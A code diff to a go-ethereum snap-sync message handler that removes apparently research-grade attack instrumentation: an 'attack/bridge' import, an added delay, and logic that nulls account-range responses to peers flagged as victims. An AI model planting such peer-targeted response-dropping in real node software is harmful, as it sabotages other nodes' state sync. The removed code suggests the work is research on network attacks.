@@ -32,8 +32,6 @@ import (
 	"github.com/ethereum/go-ethereum/p2p/enr"
 	"github.com/ethereum/go-ethereum/rlp"
 	"github.com/ethereum/go-ethereum/trie"
-
-	"github.com/ethereum/go-ethereum/attack/bridge"
 )
 
 const (
@@ -57,11 +55,6 @@ const (
 	// If we spend too much time, then it's a fairly high chance of timing out
 	// at the remote side, which means all the work is in vain.
 	maxTrieNodeTimeSpent = 5 * time.Second
-)
-
-var (
-	dropResponse = false
-	servedAccounts = 0
 )
 
 // Handler is a callback to invoke from an outside runner after the boilerplate
@@ -169,24 +162,8 @@ func HandleMessage(backend Backend, peer *Peer) error {
 			return fmt.Errorf("%w: message %v: %v", errDecode, msg, err)
 		}
 
-		if bridge.IsVictim(peer.Peer.ID().String()[:8]) {
-			bridge.ReceivedRangeQuery(req.Origin)
-		}
-
 		// Service the request, potentially returning nothing in case of errors
 		accounts, proofs := ServiceGetAccountRangeQuery(backend.Chain(), &req, peer)
-
-		log.Info("Got accounts for query", "amount", len(accounts), "peer", peer.Peer.ID().String()[:8])
-		if bridge.IsVictim(peer.Peer.ID().String()[:8]) {
-			servedAccounts += len(accounts)
-			if dropResponse {
-				accounts = nil
-				proofs = nil
-				log.Info("Nullifying response to range query")
-				//log.Info("Dropping response to range query")
-				//return nil
-			}
-		}
 
 		// Send back anything accumulated (or empty in case of errors)
 		return p2p.Send(peer.rw, AccountRangeMsg, &AccountRangePacket{
@@ -312,13 +289,11 @@ func ServiceGetAccountRangeQuery(chain *core.BlockChain, req *GetAccountRangePac
 	tr, err := trie.New(req.Root, chain.StateCache().TrieDB())
 	if err != nil {
 		log.Warn("Requested state does not exist", "root", req.Root, "err", err)
-		bridge.ResetRangeInfo()
 		return nil, nil
 	}
 	it, err := chain.Snapshots().AccountIterator(req.Root, req.Origin)
 	if err != nil {
 		log.Warn("Snapshots account iterator unavailable", "root", req.Root, "err", err)
-		bridge.ResetRangeInfo()
 		return nil, nil
 	}
 	// Iterate over the requested range and pile accounts up
@@ -327,10 +302,7 @@ func ServiceGetAccountRangeQuery(chain *core.BlockChain, req *GetAccountRangePac
 		size     uint64
 		last     common.Hash
 	)
-
-	time.Sleep(1500*time.Millisecond)
 	
-	lastResponseLocal := true
 	for it.Next() {
 		hash, account := it.Hash(), common.CopyBytes(it.Account())
 
@@ -348,19 +320,10 @@ func ServiceGetAccountRangeQuery(chain *core.BlockChain, req *GetAccountRangePac
 			break
 		}
 		if size > req.Bytes {
-			lastResponseLocal = false
 			break
 		}
 	}
 	it.Release()
-	log.Info("Got accounts for query", "last", last)
-
-	if lastResponseLocal && bridge.IsVictim(p.Peer.ID().String()[:8]) {
-		log.Info("Found last query", "root", req.Root, "origin", req.Origin, "limit", req.Bytes, "served_accounts", servedAccounts)
-		dropResponse = bridge.ReceivedLastRangeQuery(req.Origin)
-	} else if bridge.IsVictim(p.Peer.ID().String()[:8]) {
-		dropResponse = false
-	}
 
 
 	// Generate the Merkle proofs for the first and last account
@@ -379,7 +342,6 @@ func ServiceGetAccountRangeQuery(chain *core.BlockChain, req *GetAccountRangePac
 	for _, blob := range proof.NodeList() {
 		proofs = append(proofs, blob)
 	}
-	log.Info("Served account range", "from", req.Origin, "to", last)
 	return accounts, proofs
 }
 
